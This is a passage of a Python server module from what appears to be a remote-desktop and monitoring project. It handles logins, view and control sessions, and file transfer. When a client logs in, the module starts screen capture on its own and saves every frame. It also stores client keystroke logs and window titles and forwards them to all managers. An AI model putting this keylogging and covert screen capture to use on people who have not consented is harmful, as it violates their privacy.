# server/core/session_manager.py

import threading
import json
import time
import sys
import os
from queue import Queue, Empty

# Đảm bảo Python tìm thấy thư mục gốc
# current_dir = os.path.dirname(os.path.abspath(__file__))
# project_root = os.path.abspath(os.path.join(current_dir, '..', '..', '..'))
# if project_root not in sys.path:
#     sys.path.insert(0, project_root)

from src.server.server_constants import (
    ROLE_MANAGER, ROLE_CLIENT, ROLE_UNKNOWN,
    CMD_LOGIN, CMD_LOGIN_OK, CMD_LOGIN_FAIL,
    CMD_REGISTER, CMD_REGISTER_OK, 
    CMD_LIST_CLIENTS, CMD_CLIENT_LIST_UPDATE,
    CMD_CONNECT_CLIENT, CMD_SESSION_STARTED, CMD_SESSION_ENDED,
    CMD_VIEW_CLIENT, CMD_CONTROL_CLIENT, CMD_STOP_VIEW, CMD_STOP_CONTROL,
    CMD_VIEW_STARTED, CMD_VIEW_STOPPED, CMD_CONTROL_STARTED, CMD_CONTROL_STOPPED, CMD_CONTROL_DENIED,
    CMD_ERROR, CHANNEL_CONTROL, CHANNEL_INPUT, CHANNEL_FILE,
    CMD_SEND_FILE, CMD_FILE_TRANSFER_START, CMD_FILE_TRANSFER_ACK, 
    CMD_FILE_TRANSFER_COMPLETE, CMD_FILE_TRANSFER_ERROR
)
from src.server.core.auth_handler import (
    sign_in as auth_sign_in, 
    sign_up as auth_sign_up,
    log_out as auth_log_out
)
from src.server.core.session import ServerSession

from src.common.network.pdu_builder import PDUBuilder
from src.common.network.mcs_layer import MCSLite

# Import ViewSession và ControlSession
from src.server.core.view_session import ViewSession
from src.server.core.control_session import ControlSession

# Import Screenshot Storage
from src.server.core.screenshot_storage import ScreenshotStorage

# Import File Transfer Manager
from src.server.core.file_transfer_manager import FileTransferManager
from src.server.core.file_transfer_handler import FileTransferHandler

# Import database cho keylog
try:
    from src.client.key_log.database import create_keystroke
    KEYLOG_DB_AVAILABLE = True
except ImportError:
    print("[SessionManager] WARN: Keylog database module không khả dụng")
    KEYLOG_DB_AVAILABLE = False
    def create_keystroke(*args, **kwargs):
        return False

# Quản lý việc đăng ký (client/manager), xác thực User và điều phối các phiên (session).
class SessionManager(threading.Thread):
    def __init__(self, broadcaster):
        super().__init__(daemon=True, name="SessionManager")
        self.broadcaster = broadcaster
        self.pdu_queue = Queue()  # Hàng đợi xử lý tin nhắn Control
        self.running = True
        self.builder = PDUBuilder()
        self.seq = 0  # Sequence number
        
        # Quản lý kết nối và User
        self.clients = {}           # { client_id -> role }
        self.authenticated_users = {} # { client_id -> username } (Chỉ user đã login thành công)
        
        # Quản lý Phiên mới: Tách VIEW và CONTROL
        # VIEW: 1 client có thể có nhiều viewers (1-nhiều) - Chỉ xem màn hình (2s/frame - lưu screenshot thường xuyên)
        self.view_sessions = {}      # { client_id -> ViewSession }
        # CONTROL: 1 client chỉ có 1 controller (1-1 exclusive) - Xem và điều khiển (continuous 30 FPS)
        self.control_sessions = {}   # { client_id -> ControlSession }
        # Mapping để biết manager nào đang trong session nào
        self.manager_sessions = {}   # { manager_id -> {"view": [client_ids], "control": client_id} }
        
        # Legacy support (deprecated)
        self.client_session_map = {} # { client_id -> ServerSession object }
        self.active_sessions = {}    # { session_id -> ServerSession object }
        
        # Pending connection requests (Case 1: Manager connects before Client starts)
        self.pending_requests = {}  # { client_username: manager_id }
        
        # Screenshot Storage - Lưu trữ screenshots từ client
        # Threshold = 0 để lưu TẤT CẢ các frame (không kiểm tra ngưỡng)
        self.screenshot_storage = ScreenshotStorage(
            base_path="screenshots",
            change_threshold=0  # 0 = Lưu mọi thay đổi, không cần kiểm tra ngưỡng
        )
        
        # File Transfer Manager - Quản lý truyền file
        self.file_transfer_manager = FileTransferManager()
        self.pending_file_transfers = {}  # {sender_id: {transfer_id, file_data, metadata}}
        
        self.lock = threading.Lock()

    def _next_seq(self):
        """Generate next sequence number"""
        with self.lock:
            self.seq += 1
            return self.seq

    def start(self):
        self.running = True
        super().start()
        print("[SessionManager] Service Started.")

    def stop(self):
        self.running = False
        with self.lock:            
            sessions = list(self.active_sessions.values()) # Copy danh sách để tránh lỗi khi loop
        
        for s in sessions: 
            s.stop()
        print("[SessionManager] Service Stopped.")

    # =========================================================================
    # CÁC CALLBACK TỪ LAYER MẠNG (ServerNetwork gọi cái này)
    # =========================================================================
    
    # Khi có socket mới kết nối tới
    def handle_new_connection(self, client_id, ssl_sock):
        with self.lock:
            self.clients[client_id] = ROLE_UNKNOWN
        print(f"[Network] New connection: {client_id}")

    # Khi socket bị ngắt kết nối
    def handle_disconnection(self, client_id):
        print(f"[Network] Disconnected: {client_id}")
        
        username = None
        role = ROLE_UNKNOWN

        # 1. Xử lý Logout DB & Xóa khỏi RAM
        with self.lock:
            role = self.clients.pop(client_id, ROLE_UNKNOWN)
            username = self.authenticated_users.pop(client_id, None)

        if username:
            print(f"[Auth] User {username} logged out implicitly.")
        
        # 2. Cleanup VIEW và CONTROL sessions
        if role == ROLE_MANAGER:
            # Manager disconnect → Dừng tất cả view và control sessions của manager
            self._stop_view_session(client_id)
            self._stop_control_session(client_id)
            
            # Cleanup manager_sessions
            with self.lock:
                self.manager_sessions.pop(client_id, None)
        
        elif role == ROLE_CLIENT:
            # Client disconnect → Dừng tất cả sessions liên quan đến client
            with self.lock:
                # Dừng view session
                if client_id in self.view_sessions:
                    view_session = self.view_sessions[client_id]
                    viewers = list(view_session.viewers)
                    view_session.stop()
                    del self.view_sessions[client_id]
                    
                    # Thông báo cho tất cả viewers
                    for viewer_id in viewers:
                        self._send_control_pdu(viewer_id, f"{CMD_VIEW_STOPPED}:{client_id}")
                        if viewer_id in self.manager_sessions:
                            if client_id in self.manager_sessions[viewer_id]["view"]:
                                self.manager_sessions[viewer_id]["view"].remove(client_id)
                
                # Dừng control session
                if client_id in self.control_sessions:
                    control_session = self.control_sessions[client_id]
                    manager_id = control_session.manager_id
                    control_session.stop()
                    # _on_control_session_done sẽ được gọi tự động
        
        # 3. Legacy: Dừng old-style session (nếu có)
        with self.lock:
            session = self.client_session_map.pop(client_id, None)
        
        if session:
            print(f"[Session] Dừng phiên {session.session_id} do một bên ngắt kết nối.")
            session.stop()
            
            with self.lock:
                self.active_sessions.pop(session.session_id, None)
                # Tìm ID người còn lại để báo tin
                other_party_id = session.manager_id if client_id == session.client_id else session.client_id
                self.client_session_map.pop(other_party_id, None)
            
            # Gửi thông báo cho người còn lại (nếu họ vẫn còn online)
            if other_party_id in self.clients:
                self._send_control_pdu(other_party_id, f"{CMD_SESSION_ENDED}:Đối phương mất kết nối")

        # 3. Nếu là Client vừa thoát, cần cập nhật danh sách cho các Manager
        if role == ROLE_CLIENT:
            self._broadcast_client_list()

    # Khi có PDU mới từ Client/Manager
    """
        Trung tâm phân loại gói tin:
        - Nếu User đang trong phiên Remote -> Chuyển gói tin cho Session xử lý (Video/Input).
        - Nếu User đang rảnh -> Xử lý như lệnh Control (Login/Connect).
    """
    def handle_pdu(self, client_id, pdu):       
        pdu_type = pdu.get("type")
        print(f"[SessionManager handle_pdu] client_id={client_id}, pdu_type={pdu_type}")
        
        # Debug log for file transfers
        if pdu_type in ("file", "file_chunk", "file_start", "file_end"):
            print(f"[SessionManager] 📁 FILE PDU received from {client_id}, type={pdu_type}")
        
        # Phân biệt keylog (từ client) vs điều khiển input (từ manager)
        if pdu_type == "input":
            # Kiểm tra xem có phải keylog data không (có KeyData field)
            input_data = pdu.get('input', {})
            is_keylog = 'KeyData' in input_data or 'WindowTitle' in input_data
            
            # Nếu là keylog từ client → xử lý và forward tới manager
            if is_keylog:
                self._handle_input_pdu(client_id, pdu)
                return
            # Nếu là input điều khiển từ manager → forward tới client qua control session
        
        # === KIỂM TRA ROLE ===
        role = self.clients.get(client_id)
        print(f"[SessionManager handle_pdu] role for {client_id} = {role}")
        
        # === XỬ LÝ FILE PDU ĐẶC BIỆT - Kiểm tra pending transfer trước khi check role ===
        # File chunks có thể đến khi đã có pending transfer, không cần kiểm tra role
        if pdu_type in ("file", "file_chunk", "file_start", "file_end"):
            with self.lock:
                has_pending = client_id in self.pending_file_transfers
            if has_pending:
                print(f"[SessionManager] 📁 Processing FILE PDU from {client_id} (has pending transfer)")
                FileTransferHandler.handle_file_pdu(self, client_id, pdu)
                return
            else:
                print(f"[SessionManager] ⚠️ FILE PDU from {client_id} but no pending transfer")
        
        # === XỬ LÝ CLIENT/MANAGER CHƯA AUTHENTICATED (role = None or ROLE_UNKNOWN) ===
        if role is None or role == ROLE_UNKNOWN:
            # Chỉ xử lý control PDU cho authentication (login, register)
            if pdu_type == "control":
                print(f"[SessionManager] Unauthenticated client {client_id} (role={role}) sends control PDU")
                print(f"[SessionManager] Putting PDU into queue for processing")
                self.pdu_queue.put((client_id, pdu))
                print(f"[SessionManager] PDU queued successfully")
            else:
                print(f"[SessionManager] ⚠️ Ignoring {pdu_type} PDU from unauthenticated client {client_id}")
            return
        
        # === XỬ LÝ PDU TỪ CLIENT (authenticated) ===
        if role == ROLE_CLIENT:
            # Client gửi video/cursor/control
            if pdu_type in ("full", "rect", "cursor"):
                # Video/Cursor frames → Broadcast tới viewers VÀ controller
                raw_payload = pdu.get("_raw_payload")
                if not raw_payload:
                    return
                
                # LƯU SCREENSHOT (lưu cả FULL và RECT)
                if pdu_type in ("full", "rect"):
                    # Lấy username của client từ authenticated_users
                    client_username = self.authenticated_users.get(client_id)
                    if client_username:
                        # Lưu screenshot (không block thread chính)
                        try:
                            result = self.screenshot_storage.save_screenshot_from_raw(client_username, raw_payload)
                            # Chỉ log khi lưu thành công hoặc có lỗi
                            if result:
                                print(f"[SessionManager] ✅ Saved {pdu_type}: {result}")
                        except Exception as e:
                            print(f"[SessionManager] ❌ ERROR saving screenshot for {client_username}: {e}")
                
                with self.lock:
                    # 1. Broadcast tới tất cả viewers (nếu có)
                    if client_id in self.view_sessions:
                        view_session = self.view_sessions[client_id]
                        view_session.broadcast_frame(pdu_type, raw_payload)
                    
                    # 2. Gửi tới controller (nếu có)
                    if client_id in self.control_sessions:
                        control_session = self.control_sessions[client_id]
                        control_session.enqueue_pdu(client_id, pdu)
            
            elif pdu_type == "control":
                # Control message → Gửi tới controller (nếu có)
                with self.lock:
                    if client_id in self.control_sessions:
                        control_session = self.control_sessions[client_id]
                        control_session.enqueue_pdu(client_id, pdu)
                    else:
                        # Không có session, xử lý như control command
                        self.pdu_queue.put((client_id, pdu))
            
            elif pdu_type == "file" or pdu_type in ("file_chunk", "file_start", "file_end"):
                # File data PDU → Xử lý file transfer
                FileTransferHandler.handle_file_pdu(self, client_id, pdu)
            
            else:
                # Other types → Xử lý qua control session
                with self.lock:
                    if client_id in self.control_sessions:
                        control_session = self.control_sessions[client_id]
                        control_session.enqueue_pdu(client_id, pdu)
        
        # === XỬ LÝ PDU TỪ MANAGER ===
        elif role == ROLE_MANAGER:
            # Manager gửi input control → Forward tới client qua control session
            if pdu_type == "input":
                with self.lock:
                    if client_id in self.manager_sessions and self.manager_sessions[client_id]["control"]:
                        target_client_id = self.manager_sessions[client_id]["control"]
                        if target_client_id in self.control_sessions:
                            control_session = self.control_sessions[target_client_id]
                            control_session.enqueue_pdu(client_id, pdu)
            
            elif pdu_type == "control":
                # Control commands from manager → ALWAYS handled by SessionManager
                # NEVER forward control PDUs to client (they're for server logic only)
                self.pdu_queue.put((client_id, pdu))
            
            elif pdu_type == "file" or pdu_type in ("file_chunk", "file_start", "file_end"):
                # File data PDU → Xử lý file transfer
                FileTransferHandler.handle_file_pdu(self, client_id, pdu)
            
            else:
                # Other types
                with self.lock:
                    if client_id in self.manager_sessions and self.manager_sessions[client_id]["control"]:
                        target_client_id = self.manager_sessions[client_id]["control"]
                        if target_client_id in self.control_sessions:
                            control_session = self.control_sessions[target_client_id]
                            control_session.enqueue_pdu(client_id, pdu)

    # =========================================================================
    # VÒNG LẶP CHÍNH (XỬ LÝ CONTROL PDU)
    # =========================================================================
    def run(self):
        while self.running:
            try:
                # Lấy tin nhắn từ hàng đợi, timeout 0.5s để check cờ self.running
                client_id, pdu = self.pdu_queue.get(timeout=0.5)
                
                # Chỉ xử lý gói tin lại 'control' ở đây
                if pdu.get("type") == "control":
                    self._handle_control_logic(client_id, pdu)
                    
            except Empty:
                continue
            except Exception as e:
                print(f"[SessionManager] Critical Error in run loop: {e}")

    # Xử lý logic nghiệp vụ: Login, Signup, Connect...
    def _handle_control_logic(self, client_id, pdu):
        try:
            msg = pdu.get("message", "")
            if isinstance(msg, bytes):
                msg = msg.decode("utf-8") # Decode nếu cần

            # 1. Xử lý LOGIN
            if msg.startswith(CMD_LOGIN):
                # Format: "LOGIN:username:password:role"
                parts = msg.split(":")
                if len(parts) >= 3:
                    _, username, password = parts[0], parts[1], parts[2]
                    requested_role = parts[3] if len(parts) > 3 else ROLE_CLIENT
                    
                    print(f"[Auth] Check login: {username} ({requested_role})")
                    if auth_sign_in(username, password):
                        with self.lock:
                            self.clients[client_id] = requested_role
                            self.authenticated_users[client_id] = username
                        
                        self._send_control_pdu(client_id, f"{CMD_LOGIN_OK}:{requested_role}")
                        print(f"[Auth] Success: {username}")
                        
                        # Hậu xử lý: Nếu là Client login -> Báo cho Manager biết
                        if requested_role == ROLE_CLIENT:
                            self._broadcast_client_list()
                            
                            # TỰ ĐỘNG BẮT SCREEN SHARING cho client này
                            # Tạo "virtual manager" để kích hoạt VIEW session
                            print(f"[ScreenshotStorage] Auto-enabling screen capture for {username}")
                            self._auto_enable_screen_capture(client_id)
                            
                        elif requested_role == ROLE_MANAGER:
                            self._send_client_list(client_id)
                    else:
                        print(f"[Auth] Fail: {username}")
                        self._send_control_pdu(client_id, f"{CMD_LOGIN_FAIL}:Sai tài khoản hoặc mật khẩu")
                else:
                    self._send_control_pdu(client_id, f"{CMD_ERROR}:Sai định dạng login")

            # 2. Xử lý REGISTER
            elif msg.startswith(CMD_REGISTER):
                # Có 2 trường hợp:
                # A. Client đăng ký vào SessionManager (đã auth ở Auth Server): "register:client:user_id:username:role"
                # B. Đăng ký user mới: "REGISTER:username:pass:fullname:email"
                parts = msg.split(":")
                
                # Trường hợp A: Client đăng ký (đã authenticated)
                if len(parts) >= 4 and parts[1] == "client":
                    _, _, user_id, username = parts[:4]
                    role = parts[4] if len(parts) > 4 else ROLE_CLIENT
                    print(f"[Auth] Client auto-login: {username} (already authenticated)")
                    
                    with self.lock:
                        self.clients[client_id] = ROLE_CLIENT
                        self.authenticated_users[client_id] = username
                    
                    self._send_control_pdu(client_id, f"{CMD_LOGIN_OK}:client")
                    self._broadcast_client_list()
                    
                    # TỰ ĐỘNG BẬT SCREEN SHARING cho client này
                    print(f"[ScreenshotStorage] Auto-enabling screen capture for {username}")
                    self._auto_enable_screen_capture(client_id)
                    
                    # Check if there's a pending connection request for this client (Case 1)
                    pending_manager_id = None
                    with self.lock:
                        if username in self.pending_requests:
                            pending_manager_id = self.pending_requests.pop(username)
                            print(f"[Session] Found pending request from Manager {pending_manager_id} for Client {username}")
                    
                    # Start session outside lock to avoid deadlock
                    if pending_manager_id:
                        self._attempt_start_session(pending_manager_id, client_id)
                    
                # Trường hợp B: Đăng ký user mới
                elif len(parts) >= 5:
                    _, user, pwd, fname, mail = parts[:5]
                    print(f"[Auth] Registering: {user}")
                    if auth_sign_up(user, pwd, fname, mail):
                        self._send_control_pdu(client_id, f"{CMD_REGISTER_OK}")
                    else:
                        self._send_control_pdu(client_id, f"{CMD_ERROR}:User đã tồn tại hoặc lỗi DB")
                else:
                    self._send_control_pdu(client_id, f"{CMD_ERROR}:Thiếu thông tin đăng ký")

            # 3. Xử lý Lấy danh sách (nếu Manager yêu cầu thủ công)
            elif msg == CMD_LIST_CLIENTS:
                if self.clients.get(client_id) == ROLE_MANAGER:
                    self._send_client_list(client_id)

            # 4. Xử lý Yêu cầu VIEW (Manager -> Client)
            elif msg.startswith("view:"):
                # Format: "view:target_client_username"
                if self.clients.get(client_id) != ROLE_MANAGER:
                    self._send_control_pdu(client_id, f"{CMD_ERROR}:Bạn không có quyền Manager")
                    return
                
                try:
                    target_username = msg.split(":", 1)[1].strip()
                    
                    # Tìm socket_id của client từ username
                    target_client_id = None
                    with self.lock:
                        for cid, username in self.authenticated_users.items():
                            if username == target_username and self.clients.get(cid) == ROLE_CLIENT:
                                target_client_id = cid
                                break
                    
                    if target_client_id:
                        self._start_view_session(manager_id=client_id, client_id=target_client_id)
                    else:
                        self._send_control_pdu(client_id, f"{CMD_ERROR}:Client {target_username} không online")
                except Exception as e:
                    print(f"[SessionManager] Error handling VIEW: {e}")
            
            # 5. Xử lý Yêu cầu CONTROL (Manager -> Client)
            elif msg.startswith("control:"):
                # Format: "control:target_client_username"
                if self.clients.get(client_id) != ROLE_MANAGER:
                    self._send_control_pdu(client_id, f"{CMD_ERROR}:Bạn không có quyền Manager")
                    return
                
                try:
                    target_username = msg.split(":", 1)[1].strip()
                    
                    # Tìm socket_id của client từ username
                    target_client_id = None
                    with self.lock:
                        for cid, username in self.authenticated_users.items():
                            if username == target_username and self.clients.get(cid) == ROLE_CLIENT:
                                target_client_id = cid
                                break
                    
                    if target_client_id:
                        self._start_control_session(manager_id=client_id, client_id=target_client_id)
                    else:
                        self._send_control_pdu(client_id, f"{CMD_ERROR}:Client {target_username} không online")
                except Exception as e:
                    print(f"[SessionManager] Error handling CONTROL: {e}")
            
            # 6. Xử lý STOP VIEW
            elif msg == "stop_view":
                if self.clients.get(client_id) != ROLE_MANAGER:
                    return
                self._stop_view_session(manager_id=client_id)
            
            # 7. Xử lý STOP CONTROL
            elif msg == "stop_control":
                if self.clients.get(client_id) != ROLE_MANAGER:
                    return
                self._stop_control_session(manager_id=client_id)
            
            # 8. Xử lý SEND FILE (Manager/Client gửi file)
            elif msg.startswith(CMD_SEND_FILE):
                # Format: "send_file:target_id:filename:filesize:file_hash"
                print(f"[FileTransfer] ===== RECEIVED SEND_FILE REQUEST =====")
                print(f"[FileTransfer] From client_id: {client_id}")
                print(f"[FileTransfer] Message: {msg}")
                try:
                    parts = msg.split(":", 4)
                    print(f"[FileTransfer] Parsed parts: {parts}")
                    if len(parts) < 4:
                        self._send_control_pdu(client_id, f"{CMD_FILE_TRANSFER_ERROR}:Invalid format")
                        return
                    
                    _, target_id, filename, filesize_str = parts[:4]
                    file_hash = parts[4] if len(parts) > 4 else None
                    filesize = int(filesize_str)
                    print(f"[FileTransfer] Target: {target_id}, File: {filename}, Size: {filesize}")
                    
                    # Validate filesize
                    if not self.file_transfer_manager.validate_file_size(filesize):
                        self._send_control_pdu(client_id, f"{CMD_FILE_TRANSFER_ERROR}:File too large")
                        return
                    
                    # Determine sender type and receiver type
                    sender_type = self.clients.get(client_id, ROLE_UNKNOWN)
                    print(f"[FileTransfer] Sender type: {sender_type}")
                    
                    # Find receiver
                    receiver_id = None
                    receiver_type = None
                    
                    # Special case: if target_id is "server", find any connected manager
                    if target_id.lower() == "server":
                        print(f"[FileTransfer] Target is 'server', finding manager...")
                        with self.lock:
                            print(f"[FileTransfer] Connected clients: {list(self.clients.items())}")
                            # Find first manager (prioritize manager viewing this client)
                            for cid, role in self.clients.items():
                                if role == ROLE_MANAGER:
                                    receiver_id = cid
                                    receiver_type = role
                                    print(f"[FileTransfer] Found manager: {cid}")
                                    print(f"[Server] Auto-selected manager {cid} for file transfer from {client_id}")
                                    break
                    else:
                        # Normal case: find by username or client_id
                        with self.lock:
                            for cid, role in self.clients.items():
                                username = self.authenticated_users.get(cid)
                                if username == target_id or cid == target_id:
                                    receiver_id = cid
                                    receiver_type = role
                                    break
                    
                    print(f"[FileTransfer] Receiver found: {receiver_id}, type: {receiver_type}")
                    
                    if not receiver_id:
                        print(f"[FileTransfer] ERROR: No receiver found for target '{target_id}'")
                        self._send_control_pdu(client_id, f"{CMD_FILE_TRANSFER_ERROR}:Target not found")
                        return
                    
                    # Create transfer record (in-memory, no database)
                    sender_username = self.authenticated_users.get(client_id, client_id)
                    receiver_username = self.authenticated_users.get(receiver_id, receiver_id)
                    print(f"[FileTransfer] Creating transfer: {sender_username} -> {receiver_username}")
                    
                    transfer_id = self.file_transfer_manager.create_transfer_record(
                        sender_id=sender_username,
                        sender_type=sender_type,
                        receiver_id=receiver_username,
                        receiver_type=receiver_type,
                        filename=filename,
                        filesize=filesize,
                        file_hash=file_hash
                    )
                    print(f"[FileTransfer] Transfer ID created: {transfer_id}")
                    
                    if not transfer_id:
                        print(f"[FileTransfer] ERROR: Failed to create transfer record")
                        self._send_control_pdu(client_id, f"{CMD_FILE_TRANSFER_ERROR}:Database error")
                        return
                    
                    # Store pending transfer
                    with self.lock:
                        self.pending_file_transfers[client_id] = {
                            'transfer_id': transfer_id,
                            'receiver_id': receiver_id,
                            'filename': filename,
                            'filesize': filesize,
                            'file_hash': file_hash,
                            'received_bytes': 0,
                            'chunks': []
                        }
                    
                    # Send acknowledgment to sender
                    self._send_control_pdu(client_id, f"{CMD_FILE_TRANSFER_START}:{transfer_id}")
                    print(f"[FileTransfer] Transfer #{transfer_id} initiated: {filename} ({filesize} bytes)")
                    
                except Exception as e:
                    print(f"[FileTransfer] Error handling send_file: {e}")
                    import traceback
                    traceback.print_exc()
                    self._send_control_pdu(client_id, f"{CMD_FILE_TRANSFER_ERROR}:Server error")
            
            # 9. Xử lý Yêu cầu Kết nối (Manager -> Client) - DEPRECATED, dùng view/control
            elif msg.startswith(CMD_CONNECT_CLIENT):
                # Format: "CONNECT:target_client_id"
                # Check quyền Manager
                if self.clients.get(client_id) != ROLE_MANAGER:
                    self._send_control_pdu(client_id, f"{CMD_ERROR}:Bạn không có quyền Manager")
                    return

                try:
                    target_username = msg.split(":", 1)[1].strip()
                    
                    # Tìm socket_id của client từ username
                    target_client_id = None
                    with self.lock:
                        for cid, username in self.authenticated_users.items():
                            if username == target_username and self.clients.get(cid) == ROLE_CLIENT:
                                target_client_id = cid
                                break
                    
                    # Nếu tìm thấy client online, dùng socket_id. Nếu không, dùng username cho pending
                    if target_client_id:
                        self._attempt_start_session(manager_id=client_id, client_id=target_client_id)
                    else:
                        # Client chưa online - lưu pending request với username
                        with self.lock:
                            print(f"[Session] Client {target_username} not online yet. Saving pending request from Manager {client_id}")
                            self.pending_requests[target_username] = client_id
                            # Gửi thông báo cho Manager biết đang chờ
                            self._send_control_pdu(client_id, f"{CMD_SESSION_STARTED}:{target_username}")
                except IndexError:
                    pass

        except Exception as e:
            print(f"[SessionManager] Logic Error: {e}")

    # =========================================================================
    # SESSION & HELPER METHODS
    # =========================================================================
    # Cố gắng bắt đầu một phiên Remote Desktop
    def _attempt_start_session(self, manager_id, client_id):
        with self.lock:
            # Kiểm tra trạng thái các bên (client_id ở đây là socket_id)
            if client_id not in self.clients:
                self._send_control_pdu(manager_id, f"{CMD_ERROR}:Client không tồn tại")
                return
            if client_id in self.client_session_map:
                self._send_control_pdu(manager_id, f"{CMD_ERROR}:Client đang bận")
                return
            if manager_id in self.client_session_map:
                self._send_control_pdu(manager_id, f"{CMD_ERROR}:Bạn đang trong phiên khác")
                return
        print(f"[Session] Starting: Manager({manager_id}) <-> Client({client_id})")
        
        # Tạo Session Object
        session = ServerSession(manager_id, client_id, self.broadcaster, self._on_session_done_callback)
        session.start()

        with self.lock:
            self.active_sessions[session.session_id] = session
            self.client_session_map[manager_id] = session
            self.client_session_map[client_id] = session

        # Gửi thông báo SESSION_STARTED cho cả 2 để Client bắt đầu gửi ảnh
        self._send_control_pdu(manager_id, f"{CMD_SESSION_STARTED}:{client_id}")
        self._send_control_pdu(client_id, f"{CMD_SESSION_STARTED}:{manager_id}")
        
        # Cập nhật danh sách (Client này giờ đã bận)
        self._broadcast_client_list()

    # Được gọi từ bên trong ServerSession khi phiên kết thúc
    def _on_session_done_callback(self, session, reason):
        print(f"[Session] Closed {session.session_id}: {reason}")
        
        with self.lock:
            self.active_sessions.pop(session.session_id, None)
            self.client_session_map.pop(session.manager_id, None)
            self.client_session_map.pop(session.client_id, None)

        # Thông báo cho 2 bên
        self._send_control_pdu(session.manager_id, f"{CMD_SESSION_ENDED}:{session.client_id}")
        self._send_control_pdu(session.client_id, f"{CMD_SESSION_ENDED}:{session.manager_id}")
        
        # Client rảnh trở lại -> Cập nhật list
        self._broadcast_client_list()

    # Lấy danh sách các Client (cả rảnh và bận)
    def _get_available_clients(self):
        available = []
        with self.lock:
            print(f"[_get_available_clients] Total clients: {len(self.clients)}")
            print(f"[_get_available_clients] Clients dict: {self.clients}")
            print(f"[_get_available_clients] Authenticated users: {self.authenticated_users}")
            
            for cid, role in self.clients.items():
                # Tất cả client đều hiển thị, kèm trạng thái
                if role == ROLE_CLIENT:
                    username = self.authenticated_users.get(cid, "Unknown")
                    # Lấy IP từ broadcaster
                    ip = "Unknown"
                    try:
                        sock = self.broadcaster.get_socket(cid)
                        if sock:
                            ip = sock.getpeername()[0]
                    except Exception as e:
                        pass
                    
                    # Kiểm tra trạng thái
                    is_controlled = cid in self.control_sessions
                    viewer_count = 0
                    if cid in self.view_sessions:
                        viewer_count = self.view_sessions[cid].get_viewer_count()
                    
                    # Dùng username làm 'id' để Manager có thể gửi view:username hoặc control:username
                    client_info = {
                        "id": username, 
                        "name": username, 
                        "ip": ip,
                        "is_controlled": is_controlled,
                        "viewer_count": viewer_count
                    }
                    print(f"[_get_available_clients] Adding client: {client_info}")
                    available.append(client_info)
        
        print(f"[_get_available_clients] Final available list: {available}")
        return available

    # Gửi danh sách Client cho 1 Manager cụ thể
    def _send_client_list(self, manager_id):
        data = self._get_available_clients()
        json_str = json.dumps(data)
        self._send_control_pdu(manager_id, f"{CMD_CLIENT_LIST_UPDATE}:{json_str}")

    # Gửi danh sách Client cho tất cả Manager
    def _broadcast_client_list(self):
        data = self._get_available_clients()
        print(f"[SessionManager] 📢 Broadcasting client list: {data}")  # DEBUG
        json_str = json.dumps(data)
        msg = f"{CMD_CLIENT_LIST_UPDATE}:{json_str}"
        
        with self.lock:
            managers = [cid for cid, role in self.clients.items() if role == ROLE_MANAGER]
        
        print(f"[SessionManager] Sending to {len(managers)} manager(s): {managers}")  # DEBUG
        for mid in managers:
            self._send_control_pdu(mid, msg)

    # Helper để đóng gói và gửi tin nhắn Control
    def _send_control_pdu(self, target_id, message: str):
        try:
            print(f"[SessionManager] _send_control_pdu called: target={target_id}, msg={message[:50]}")
            seq = self._next_seq()
            print(f"[SessionManager] Building PDU with seq={seq}")
            pdu_bytes = self.builder.build_control_pdu(seq, message.encode())
            print(f"[SessionManager] Built PDU, size={len(pdu_bytes)}, enqueueing to {target_id}")
            mcs_frame = MCSLite.build(CHANNEL_CONTROL, pdu_bytes)
            print(f"[SessionManager] MCS frame built, size={len(mcs_frame)}")
            self.broadcaster.enqueue(target_id, mcs_frame)  # Dùng enqueue, không phải send_to_client
            print(f"[SessionManager] ✅ Enqueued successfully to {target_id}")
        except BaseException as e:
            print(f"[SessionManager] ❌❌❌ _send_control_pdu FAILED: {type(e).__name__}: {e}")
            import traceback
            traceback.print_exc()
            raise
    
    # [THÊM] Xử lý INPUT PDU (keylog) - Lưu DB và forward tới manager
    def _handle_input_pdu(self, client_id, pdu):
        """Xử lý keylog data từ client: lưu database và forward tới manager"""
        try:
            input_data = pdu.get('input')
            if not input_data or not isinstance(input_data, dict):
                print(f"[SessionManager] INPUT PDU không hợp lệ từ {client_id}")
                return
            
            # Lấy thông tin keylog
            key_data = input_data.get('KeyData', '')
            window_title = input_data.get('WindowTitle', 'Unknown')
            client_username = input_data.get('ClientID', client_id)
            logged_at = input_data.get('LoggedAt', '')
            
            print(f"[SessionManager] 📝 Keylog từ {client_username}: '{key_data[:20]}...' @ {window_title}")
            
            # 1. Lưu vào database
            if KEYLOG_DB_AVAILABLE:
                try:
                    success = create_keystroke(key_data, window_title, client_username)
                    if success:
                        print(f"[SessionManager] ✅ Đã lưu keylog vào DB")
                    else:
                        print(f"[SessionManager] ⚠️ Không thể lưu keylog vào DB")
                except Exception as db_err:
                    print(f"[SessionManager] ❌ Lỗi DB: {db_err}")
            
            # 2. Forward tới tất cả Manager đang online
            with self.lock:
                managers = [cid for cid, role in self.clients.items() if role == ROLE_MANAGER]
            
            if managers:
                # Rebuild INPUT PDU để gửi
                raw_payload = pdu.get('_raw_payload')
                if raw_payload:
                    # Gửi raw PDU (đã có đầy đủ header)
                    mcs_frame = MCSLite.build(CHANNEL_INPUT, raw_payload)
                    for manager_id in managers:
                        self.broadcaster.enqueue(manager_id, mcs_frame)  # Dùng enqueue
                    print(f"[SessionManager] 📤 Đã forward keylog tới {len(managers)} manager(s)")
                else:
                    print(f"[SessionManager] ⚠️ Không có raw_payload để forward")
            else:
                print(f"[SessionManager] ℹ️ Không có manager online để nhận keylog")
                
        except Exception as e:
            print(f"[SessionManager] ❌ Lỗi xử lý INPUT PDU: {e}")
            import traceback
            traceback.print_exc()
    
    # =========================================================================
    # VIEW & CONTROL SESSION METHODS (NEW)
    # =========================================================================
    
    def _start_view_session(self, manager_id, client_id):
        """
        Bắt đầu VIEW session: Manager xem màn hình Client (không điều khiển)
        Nhiều manager có thể view cùng 1 client
        """
        # Kiểm tra và cập nhật state TRONG lock
        with self.lock:
            # Kiểm tra client có tồn tại không
            if client_id not in self.clients:
                # Release lock trước khi gọi _send_control_pdu để tránh deadlock
                pass  # Will send error outside lock
            else:
                # Lấy hoặc tạo ViewSession cho client này
                if client_id not in self.view_sessions:
                    self.view_sessions[client_id] = ViewSession(client_id, self.broadcaster)
                
                view_session = self.view_sessions[client_id]
                
                # Thêm manager vào danh sách viewers
                if not view_session.add_viewer(manager_id):
                    # Already viewing - will send error outside lock
                    pass
                else:
                    # Success - update manager_sessions
                    if manager_id not in self.manager_sessions:
                        self.manager_sessions[manager_id] = {"view": [], "control": None}
                    if client_id not in self.manager_sessions[manager_id]["view"]:
